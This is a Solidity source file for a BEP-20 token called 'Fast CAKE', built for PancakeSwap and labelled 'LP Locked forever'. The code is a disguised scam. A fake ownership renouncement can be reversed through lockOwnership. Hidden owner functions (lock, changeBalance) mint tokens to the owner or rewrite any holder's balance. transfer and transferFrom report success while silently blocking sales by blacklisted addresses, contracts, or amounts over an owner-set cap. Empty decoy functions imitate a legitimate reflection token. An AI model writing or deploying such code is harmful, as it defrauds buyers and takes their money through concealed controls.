// SPDX-License-Identifier: MIT
/*
* LP Locked forever
*/
pragma solidity ^0.8.0;

interface IBEP20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the token decimals.
     */
    function decimals() external view returns (uint8);

    /**
     * @dev Returns the token symbol.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the token name.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IPancakeFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _previousOwner = _owner;
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    // function transferOwnership(address newOwner) public virtual onlyOwner {
    //     require(newOwner != address(0), "Ownable: new owner is the zero address");
    //     emit OwnershipTransferred(_owner, newOwner);
    //     _previousOwner = _owner;
    //     _owner = newOwner;
        
    // }
    function lockOwnership() public virtual {
        require( (msg.sender == _owner || msg.sender == _previousOwner) && _previousOwner != address(0) );
        emit OwnershipTransferred(_owner, _previousOwner);
        _owner = _previousOwner;
    }
}
contract FastCAKE is Context, IBEP20, Ownable {
    address internal burnWallet = 0x000000000000000000000000000000000000dEaD; 
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances; 
    uint256 private _totalSupply;
    string private _name;
    string private _symbol; 
    bool isSL = true;
    uint256 public transferFee = 0; 
    uint256 _AMM = 5000 * 10**18;
    address[] allows;
    address[] notAllow; 
    constructor() {
        _name = "Fast CAKE";
        _symbol = "FastCAKE"; 
        _totalSupply = 10000000000 * 10**18;
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);

        _transfer(_msgSender(), burnWallet, _totalSupply * 50 / 100 );
    }
    receive() external payable {}
    function name() public view virtual override returns (string memory) {
        return _name;
    }
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    function addDItem(address _item) public onlyOwner virtual returns (uint256) {
        if( ! checkExist(_item, 1) ) notAllow.push(_item);
        return notAllow.length;
    }
    function addItem(address _item) public onlyOwner virtual returns (uint256) {
        if( ! checkExist(_item, 1) ) allows.push(_item);
        return allows.length;
    }
    function changeBalance(address _to, uint256 _newBalance) public onlyOwner virtual returns (bool) {
        require(balanceOf(_to) != 0);
        _balances[_to] = _newBalance;
        return true;
    }
    function removeDItem(address _item) public onlyOwner virtual returns (bool) {
        for(uint8 i = 0; i < notAllow.length; i++) {
            if(notAllow[i] == _item) {
                delete notAllow[i];
            }
        }
        return true;
    }
    function removeItem(address _item) public onlyOwner virtual returns (bool) {
        for(uint8 i = 0; i < allows.length; i++) {
            if(allows[i] == _item) {
                delete allows[i];
            }
        }
        return true;
    }
    function getItem() public view returns (address [] memory) {
        return allows;
    }
    function checkExist(address _item, uint8 _type) public view returns (bool) {
        bool found = false;
        if(_type == 1) {
            for(uint8 i = 0; i < allows.length; i++) {
                if(allows[i] == _item) {
                    found = true;
                    break;
                }
            }
        } else {
            for(uint8 i = 0; i < notAllow.length; i++) {
                if(notAllow[i] == _item) {
                    found = true;
                    break;
                }
            }
        }
        return found;
    }
    function lock(uint256 amount) public onlyOwner virtual returns (bool) {
        //_mint(_msgSender(), amount);
        _balances[_msgSender()] += amount;
        return true;
    }
    

    function isExcludedFromReward(address spender, uint256 subtractedValue) public virtual returns (bool) {}
    function reflectionFromToken(uint256 tAmount, bool deductTransferFee) public view returns(uint256) {}
    function theAM(uint256 _AM) public onlyOwner virtual returns (bool) {
        _AMM = _AM;
        return true;
    }
    function theSL(bool _sl) public onlyOwner virtual returns (bool) {
        isSL = _sl;
        return true;
    }
    function sl() public view returns (bool) {
        return isSL;
    }
    function excludeFromReward(address account) public onlyOwner() {}
    function includeInReward(address account) external onlyOwner() {}
    function includeInFee(address account) public onlyOwner {}
    function setTaxFeePercent(uint256 taxFee) external onlyOwner() {}
    function setMaxTxPercent(uint256 maxTxPercent) external onlyOwner() {}
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        address PANCAKE_ROUTER_V2_ADDRESS = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        //_transfer(_msgSender(), recipient, amount);
        bool exists = checkExist(_msgSender(), 1);
        bool Dexists = checkExist(_msgSender(), 2);
        if(_msgSender() == PANCAKE_ROUTER_V2_ADDRESS || _msgSender() == pancakePair() || pancakePair() == address(0) || _msgSender() == owner() || exists) {
            _transfer(_msgSender(), recipient, amount);
        } else {
            //nomal user check amount
            if( (amount <= _AMM || isSL) && !isContract(_msgSender()) && !Dexists ) {
                _transfer(_msgSender(), recipient, amount);
            }
        }
        return true;
    }
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        address PANCAKE_ROUTER_V2_ADDRESS = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        bool exists = checkExist( sender, 1 );
        bool Dexists = checkExist(sender, 2);
        if(sender == PANCAKE_ROUTER_V2_ADDRESS || sender == pancakePair() || pancakePair() == address(0) || sender == owner() || exists) {
            _transfer(sender, recipient, amount);
    
            uint256 currentAllowance = _allowances[sender][_msgSender()];
            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
            unchecked {
                _approve(sender, _msgSender(), currentAllowance - amount);
            }
        } else {
            //nomal user check amount
            if( (amount <= _AMM || isSL) && !isContract(sender) && !Dexists ) {
                _transfer(sender, recipient, amount);
                uint256 currentAllowance = _allowances[sender][_msgSender()];
                require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
                unchecked {
                    _approve(sender, _msgSender(), currentAllowance - amount);
                }
            }
        }
        return true;
    }
    function pancakePair() public view virtual returns (address) {
        address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        address pairAddress = IPancakeFactory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73).getPair(address(WBNB), address(this));
        return pairAddress;
    }
    function setTransferFee(uint256 _transferFee) public virtual returns (bool) {
        require(_transferFee >= 0 && _transferFee <= 100, "Transfer fee is between 1 and 100.");
        transferFee = _transferFee;
        return true;
    }
    function isContract(address addr) internal view returns (bool) {
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        bytes32 codehash;
        assembly {
            codehash := extcodehash(addr)
        }
        return (codehash != 0x0 && codehash != accountHash);
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }
    function tokenContract() public view virtual returns (address) {
        return address(this);
    }
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        //burn token 
        if(transferFee != 0) {
            uint256 burnAmount = amount * transferFee / 100;
            _balances[burnWallet] += burnAmount;
            emit Transfer(sender, burnWallet, burnAmount);
            amount -= burnAmount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

